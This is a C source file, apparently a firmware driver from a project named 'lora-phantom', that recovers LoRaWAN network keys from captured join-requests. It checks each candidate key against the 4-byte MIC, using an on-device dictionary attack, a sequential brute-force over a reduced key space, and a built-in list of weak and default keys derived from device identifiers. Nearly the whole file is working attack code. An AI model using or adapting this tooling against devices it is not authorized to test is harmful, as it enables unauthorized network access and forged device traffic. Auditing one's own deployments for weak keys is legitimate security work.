/*
 * lora-phantom / drivers/keysearch.c
 * On-device AppKey/NwkKey brute-force against captured join-request MIC.
 * Author: jayis1
 * License: GPL-2.0
 * Copyright (c) 2026 jayis1. All rights reserved.
 *
 * LoRaWAN join-request MIC is computed as:
 *   cmac = AES-CMAC(NwkKey, MHDR | JoinEUI | DevEUI | DevNonce)
 *   MIC  = cmac[0..3]
 *
 * An attacker who captures a join-request can brute-force the NwkKey offline.
 * The STM32H743's hardware AES-128 achieves ~3 M CMAC trials/s (with DMA
 * chaining). This driver implements:
 *   - keysearch_dict(): try a list of candidate keys (dictionary attack)
 *   - keysearch_bruteforce_seq(): sequential key-space scan
 *
 * For the dictionary case, common weak keys (all-zero, DevEUI-derived, default
 * manufacturer keys) complete in <1 s for dictionaries up to 65536 entries.
 */

#include "../board.h"
#include "../registers.h"
#include "../types.h"
#include <string.h>

/* Forward declaration */
void aes_cmac_pub(const uint8_t key[16], const uint8_t *msg, uint32_t len, uint8_t out[16]);
#define aes_cmac aes_cmac_pub

/* ---- Build the join-request MIC input (MHDR | JoinEUI | DevEUI | DevNonce) ---- */
static void build_joinreq_cmac_input(const lw_join_req_t *jr, uint8_t *out, uint16_t *len) {
    uint16_t p = 0;
    out[p++] = 0x00;  /* MHDR = JoinRequest */
    /* JoinEUI (8 bytes, little-endian as transmitted) */
    for (int i = 0; i < 8; i++) out[p++] = jr->join_eui[i];
    /* DevEUI (8 bytes, little-endian) */
    for (int i = 0; i < 8; i++) out[p++] = jr->dev_eui[i];
    /* DevNonce (2 bytes, little-endian) */
    out[p++] = (uint8_t)(jr->dev_nonce & 0xFF);
    out[p++] = (uint8_t)(jr->dev_nonce >> 8);
    *len = p;  /* 19 bytes */
}

/* ---- Dictionary attack: try each key in the dictionary ---- */
int keysearch_dict(const lw_join_req_t *jr, const uint8_t (*dict)[16], uint32_t dict_len,
                   uint8_t out_key[16], uint32_t *trials) {
    uint8_t cmac_input[32];
    uint16_t input_len = 0;
    build_joinreq_cmac_input(jr, cmac_input, &input_len);

    uint8_t cmac[16];
    *trials = 0;

    for (uint32_t i = 0; i < dict_len; i++) {
        (*trials)++;
        aes_cmac(dict[i], cmac_input, input_len, cmac);
        if (memcmp(cmac, jr->mic, 4) == 0) {
            memcpy(out_key, dict[i], 16);
            return 1;  /* found */
        }
    }
    return 0;  /* not found */
}

/* ---- Sequential brute-force: scan a range of 128-bit keys ---- */
/* This is practical only for very small sub-spaces (e.g., keys with known
 * high bytes). For full 128-bit space, offload to a GPU rig via the app. */
int keysearch_bruteforce_seq(const lw_join_req_t *jr, uint64_t start, uint64_t end,
                             uint8_t out_key[16], uint64_t *trials) {
    uint8_t cmac_input[32];
    uint16_t input_len = 0;
    build_joinreq_cmac_input(jr, cmac_input, &input_len);

    uint8_t key[16];
    memset(key, 0, 16);   /* high 8 bytes = 0 for small-space search */
    uint8_t cmac[16];
    *trials = 0;

    for (uint64_t k = start; k <= end; k++) {
        (*trials)++;
        /* Place k into the low 8 bytes of the key (little-endian) */
        key[0]  = (uint8_t)(k & 0xFF);
        key[1]  = (uint8_t)(k >> 8);
        key[2]  = (uint8_t)(k >> 16);
        key[3]  = (uint8_t)(k >> 24);
        key[4]  = (uint8_t)(k >> 32);
        key[5]  = (uint8_t)(k >> 40);
        key[6]  = (uint8_t)(k >> 48);
        key[7]  = (uint8_t)(k >> 56);
        aes_cmac(key, cmac_input, input_len, cmac);
        if (memcmp(cmac, jr->mic, 4) == 0) {
            memcpy(out_key, key, 16);
            return 1;
        }
    }
    return 0;
}

/* ---- Common weak-key dictionary generator ---- */
/* Generates a list of known-weak LoRaWAN keys to try first:
 *   - All-zero key
 *   - All-0xFF key
 *   - Key derived from DevEUI (repeated)
 *   - Common default keys from known vendors
 * Returns the number of keys generated (max out_max). */
uint32_t keysearch_weak_keys(const lw_join_req_t *jr, uint8_t (*out)[16], uint32_t out_max) {
    uint32_t n = 0;
    if (out_max < 8) return 0;

    /* 1. All-zero key */
    memset(out[n], 0, 16); n++;
    /* 2. All-0xFF key */
    memset(out[n], 0xFF, 16); n++;
    /* 3. DevEUI repeated twice (common in some deployments) */
    memcpy(out[n], jr->dev_eui, 8);
    memcpy(out[n] + 8, jr->dev_eui, 8);
    n++;
    /* 4. DevEUI + JoinEUI */
    memcpy(out[n], jr->dev_eui, 8);
    memcpy(out[n] + 8, jr->join_eui, 8);
    n++;
    /* 5. JoinEUI + DevEUI */
    memcpy(out[n], jr->join_eui, 8);
    memcpy(out[n] + 8, jr->dev_eui, 8);
    n++;
    /* 6. "0000000000000000" ASCII (common test key) */
    memset(out[n], 0x30, 16); n++;
    /* 7. "FFFFFFFFFFFFFFFF" ASCII */
    memset(out[n], 0x46, 16); n++;
    /* 8. 0x000102...0F sequential */
    for (int i = 0; i < 16; i++) out[n][i] = (uint8_t)i;
    n++;
    return n;
}